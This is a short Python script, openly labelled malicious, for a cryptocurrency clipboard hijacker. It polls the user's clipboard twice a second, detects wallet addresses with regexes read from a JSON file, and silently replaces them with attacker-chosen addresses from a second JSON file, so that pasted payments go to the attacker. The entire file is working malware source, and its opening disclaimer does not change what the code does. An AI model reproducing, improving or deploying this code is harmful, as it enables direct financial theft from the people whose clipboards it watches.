# Warning! This code is malicious, I take 0 responsibility for misuse.
import pyperclip
import json
import time
import re
import sys


def found_crypto(user_clipboard: str) -> str:
    """Returns name of found crypto in user_clipboard"""

    # open matches
    with open("regex_match.json") as json_file:
        regex_addresses = json.load(json_file)

    # go through matches, check if any regex matches user_clipboard
    for crypto_name, crypto_address in regex_addresses.items():
        if bool(re.search(crypto_address, user_clipboard)):
            return crypto_name
    return None  # no crypto found


def replace_clipboard(found_crypto: str) -> str:
    with open("addresses.json") as json_file:
        master_addresses = json.load(json_file)

    if master_addresses[found_crypto] != "ignore":
        pyperclip.copy(master_addresses[found_crypto])
        print(f"Replaced:{master_addresses[found_crypto]}")


def main():
    print("Watching")
    while True:
        try:
            time.sleep(0.5)
            user_clipboard = str(pyperclip.paste())

            # check if found
            found_crypto_name = found_crypto(user_clipboard)
            if found_crypto_name is not None:
                # if so replace
                print(f"Found:{found_crypto_name}")
                replace_clipboard(found_crypto_name)
        except KeyboardInterrupt:
            print("Goodbye.")
            sys.exit(0)


main()
